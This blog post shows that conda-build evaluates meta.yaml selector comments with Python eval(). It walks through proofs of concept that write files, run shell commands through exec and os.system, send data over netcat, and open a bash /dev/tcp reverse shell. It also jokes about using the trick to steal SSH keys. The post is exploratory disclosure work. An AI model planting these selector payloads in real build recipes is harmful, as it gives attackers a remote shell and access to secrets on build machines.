---
title: Abusing Conda's Turing-Complete YAML Comments
tagline: my favorite build system, jinja-preprocessed-eval-preprocessed YAML
tags:
  - python
  - anaconda
  - cybersecurity
slug:
  date: 2024-02-24
  ordinal: 0
  name: conda-recipe-selector-abuse
date:
  created: 2024-02-23 23:22:51-08:00
  published: 2024-02-24 01:25:25-08:00
syndications:
  - https://news.ycombinator.com/item?id=39490740
---

I was trying to submit a Conda package to
[Conda Forge](https://conda-forge.org/), and I needed a way to mark it as Linux
and MacOS only. As it turns out, you are supposed to define something like this
in your `meta.yaml` build configuration file:

```yaml
build:
  skip: True # [win]
```

What this seems to mean is, "skip the build if we are in windows." Why is it a
comment? I don't know, but that's what it is.

This package also is a Python 3.9 and above thing -- we don't support 3.8 or
under. So, how do I add that constraint?

Well, turns out this strange construct is called a "selector," and there's a
section about what you can do with it in the
[Conda docs](https://docs.conda.io/projects/conda-build/en/stable/resources/define-metadata.html#preprocessing-selectors)

> You can add selectors to any line, which are used as part of a preprocessing
> stage. Before the `meta.yaml` file is read, each selector is evaluated and if
> it is `False`, the line that it is on is removed. A selector has the form
> `# [<selector>]` at the end of a line.
>
> ```yaml
> source:
>   url: http://path/to/unix/source    # [not win]
>   url: http://path/to/windows/source # [win]
> ```

Oh, that makes sense. Cursed, because YAML _shouldn't_ look like this with
multiple keys in one object, but it makes sense.

> A selector is a valid Python statement that is executed.

Wait... what?

> Because the selector is any valid Python expression, complicated logic is
> possible:
>
> ```yaml
> source:
>   url: http://path/to/windows/source      # [win]
>   url: http://path/to/python2/unix/source # [unix and py2k]
>   url: http://path/to/python3/unix/source # [unix and py>=35]
> ```

Wait, _WHAT_?

So... what it's saying is... this is what I want?

```yaml
build:
  skip: True # [win or py < 39]
```

I put that into my `meta.yaml` and... turns out it made it work!

But then, I got wondering, what _other_ kinds of "complicated logic" is allowed
in this selector?

## Trying to accomplish arbitrary code execution

I borrowed the following `meta.yaml` file from
[conda-forge's example](https://github.com/conda-forge/staged-recipes/blob/main/recipes/example/meta.yaml),
but stripped it down a lot.

```yaml
{% set name = "simplejson" %}
{% set version = "3.8.2" %}

package:
  name: {{ name|lower }}
  version: {{ version }}

source:
  url: https://pypi.io/packages/source/{{ name[0] }}/{{ name }}/{{ name }}-{{ version }}.tar.gz
  sha256: 2b3a0c466fb4a1014ea131c2b8ea7c519f9278eba73d6fcb361b7bdb4fd494e9

build:
  script: {{ PYTHON }} -m pip install . -vv
  number: 0

requirements:
  host:
    - python
    - pip
  run:
    - python

test:
  skip: True

about:
  home: https://github.com/simplejson/simplejson
  summary: 'Simple, fast, extensible JSON encoder/decoder for Python'
  description: test
  dev_url: https://github.com/simplejson/simplejson

extra:
  recipe-maintainers:
    - ifd3f
```

Then, I inserted the following string to see if it would work.

```yaml
build:
  skip: True # [open('/tmp/foo', 'w').write("nyaaaaaa")]
```

I ran `conda build`:

```
nyaaaaaa(base) [astrid@lab test]$ conda build .
WARNING: No numpy version specified in conda_build_config.yaml.  Falling back to default numpy value of 1.22
Adding in variants from internal_defaults
Skipped: simplejson from /home/astrid/test defines build/skip for this configuration ({'target_platform': 'linux-64', 'python': '3.11'}).

<snip>
```

It spits out a lot of output. We don't need to go over all of it. It seemed to
have immediately quit.

But, checking `/tmp/foo`...

```
(base) [astrid@lab test]$ cat /tmp/foo
nyaaaaaa(base) [astrid@lab test]$
```

It fucking worked!!!

## Where can the selector be placed?

I thought it might be smart to do something like this so that I don't
accidentally spit out a falsy value and make conda actually build the project,
instead of only doing whatever shenanigans I was trying to accomplish.

```yaml
...
source:
  url: https://pypi.io/packages/source/{{ name[0] }}/{{ name }}/{{ name }}-{{ version }}.tar.gz
  sha256: 2b3a0c466fb4a1014ea131c2b8ea7c519f9278eba73d6fcb361b7bdb4fd494e9

# [open('/tmp/foo2', 'w').write("nyaaaaaa")]

build:
  skip: True
  script: {{ PYTHON }} -m pip install . -vv
...
```

```
(base) [astrid@lab test]$ conda build . && cat /tmp/foo2
...
cat: /tmp/foo2: No such file or directory
```

Why didn't it work? Maybe it's because the selector code is searching
specifically for a comment with stuff in front of it. I don't know. Either way,
I can live with putting it on one of the attributes.

## Making it run a shell command

Let's try to have it run a shell. This can't be too hard, right?

```yaml
skip: True # [import os; os.system("echo test")]
```

```
(base) [astrid@lab test]$ conda build .
WARNING: No numpy version specified in conda_build_config.yaml.  Falling back to default numpy value of 1.22
Error: Invalid selector in meta.yaml line 14:
offending line:
  skip: True # [import os; os.system("echo test")]
exception:
invalid syntax (<string>, line 1)
```

Seems like it didn't like that. Probably because it specifically accepts an
expression, not a series of statements.

After a bit of digging around, turns out the answer was `exec()` (plus a
`or True` to make it not build).

```yaml
skip: True # [exec('''import os; os.system("sh -c 'echo shell moment > /tmp/asdf'")''') or True]
```

````
(base) [astrid@lab test]$ rm -f /tmp/asdf && conda build . && cat /tmp/asdf
WARNING: No numpy version specified in conda_build_config.yaml.  Falling back to default numpy value of 1.22

<snip>

Source and build intermediates have been left in /home/astrid/miniconda3/conda-bld.
There are currently 3 accumulated.
To remove them, you can run the ```conda build purge``` command
shell moment
(base) [astrid@lab test]$
````

## Making it talk to other computers

At this point, you can kinda just run whatever. Installing `netcat`, I used
this:

```yaml
skip: True # [exec('''import os; os.system("sh -c 'echo netnya | nc localhost 12345'")''') or True]
```

In a separate shell, I opened a server:

```
(base) [astrid@lab test]$ nc -l localhost 12345
```

Performing a build...

```
(base) [astrid@lab test]$ conda build .
WARNING: No numpy version specified in conda_build_config.yaml.  Falling back to default numpy value of 1.22
```

... conda froze! But in the other tab, I got the message.

```
(base) [astrid@lab test]$ nc -l localhost 12345
netnya
```

I typed `asdfasdf` into the server tab, and got data back in the builder.

```
(base) [astrid@lab test]$ conda build .
WARNING: No numpy version specified in conda_build_config.yaml.  Falling back to default numpy value of 1.22
asdfasdf
```

## Making it spawn a reverse shell

This is, of course, the logical final step. In fact, this selector doesn't even
need netcat.

```yaml
skip: True # [exec('''import os; os.system("bash -c 'bash -i >& /dev/tcp/localhost/12345  0>&1'")''') or True]
```

## Exploitability?

Honestly, I don't think that there's much that's exploitable about this that
isn't already exploitable. As far as I know, `conda build` doesn't do
containerization or other security measures like that, so any amount of
exploitation I can do here is probably already exploitable by the build script.

I mean, I guess I _could_ see a potential case where `conda build` has a command
that spits out the `meta.yaml` after it has done its jinja and selector
postprocessing, but without executing any scripts, and the user would expect
that no arbitrary code execution is happening. In practice, I don't think that's
really common -- most people probably just run `conda build`.

However, this is great for recipe developers -- this mechanism lets you make
your build logic be non-deterministic, and have arbitrarily-complicated logic
and I/O! You can do all sorts of things, like don't build if the user's name
starts with an "a," combine this with curl and an HTTP server to act as a
killswitch for builds, make the metadata evaluation step "borrow" peoples' SSH
keys, and more!

## What's the code that actually calls eval?

The great thing about open source is that you can actually answer this question!

In the [conda-build repository](conda-build-repo), I searched for `eval`, and
[this was the function][eval-line] that seems to do it.

```python
# We evaluate the selector and return True (keep this line) or False (drop this line)
# If we encounter a NameError (unknown variable in selector), then we replace it by False and
#     re-run the evaluation
def eval_selector(selector_string, namespace, variants_in_place):
    try:
        # TODO: is there a way to do this without eval?  Eval allows arbitrary
        #    code execution.
        return eval(selector_string, namespace, {})
    except NameError as e:
        ...
```

This code was last touched... [2017, in PR #1753](pr-1753). And that wasn't the
thing that actually introduced the `eval()`, that commit just moved it to a
different place.
[Here's what it used to look like before that commit](older-eval-line):

```python
def select_lines(data, namespace):
    ...

    try:
        # TODO: is there a way to do this without eval?  Eval allows arbitrary
        #    code execution.
        if eval(cond, namespace, {}):
            lines.append(m.group(1) + trailing_quote)
    except:
        ...

```

The comment came [in this 2016 commit](fixes-recommended) from either
[a group called Quantified Code](qc-github-org) (whose website,
[www.quantifiedcode.com](qc-broken-website), appears to no longer work), or some
automated tool they appear to have written. The `eval()`, on the other hand,
came from
[this 2,532-line commit in 2014 with the very informative title of "add new files"](add-new-files-commit).

I tried searching the issues to see if anyone has complained about how silly
this `eval()` is, but I didn't find anything. Perhaps people don't mind at all.
Perhaps there are even other people out there who are including shell scripts in
their selectors!

[pr-1753]: https://github.com/conda/conda-build/pull/1753
[conda-build-repo]: https://github.com/conda/conda-build
[eval-line]:
  https://github.com/conda/conda-build/blob/cc7bb532eff61451853a8195f39688a2101a9548/conda_build/metadata.py#L255-L257
[older-eval-line]:
  https://github.com/conda/conda-build/blob/761b3dc00e85ab3f8e7443417cd1d3888d2cce04/conda_build/metadata.py#L109-L112
[fixes-recommended]:
  https://github.com/conda/conda-build/commit/d52852da9722e4b9b19664f7d0614b5ee5dfebdf#diff-a3f5613bda9366e31149c65731327047d4e29204c9e0508fd55416115b39a6bdR110-R111
[add-new-files-commit]:
  https://github.com/conda/conda-build/commit/fe7f773010f4c8c200298c83a4164ca404626d52#diff-a3f5613bda9366e31149c65731327047d4e29204c9e0508fd55416115b39a6bdR52-R53
[qc-github-org]: https://github.com/quantifiedcode
[qc-broken-website]: http://www.quantifiedcode.com/

## Conclusion

Honestly, I don't know how to conclude this. It's a really silly thing that you
can do, but it's not even particularly exploitable. What I probably would have
done if I wanted to implement something like this was cut the
selector/jinja/YAML crap and just let the user write a Python script to generate
this if you want your damn "flexibility."

Okay, fine, maybe people really like their selector/jinja/YAML configs, and I
really just had to deal with that fact. In that case, I would just was write a
100-200 line parser and interpreter for selector booleans. But my guess is that
they probably rushed this and didn't really fix it either.

Honestly, maybe I'm just being really negative. I'll leave the final word to
ChatGPT, who I have asked to help us be more optimistic about
arbitrarily-executable YAML comments.

> Arbitrary code execution within configuration file comments epitomizes the
> flexibility and agility central to modern DevOps practices, providing
> developers with unparalleled customization, dynamic configuration management,
> self-documentation, automation, and advanced configuration options. By
> harnessing executable code snippets within comments, teams can swiftly adapt
> to changing requirements, seamlessly integrating infrastructure as code (IaC)
> principles into agile deployment pipelines and continuous
> integration/continuous deployment (CI/CD) workflows. This capability fosters a
> culture of innovation, enabling rapid iteration, experimentation, and
> optimization, while ensuring infrastructure scalability and reliability.
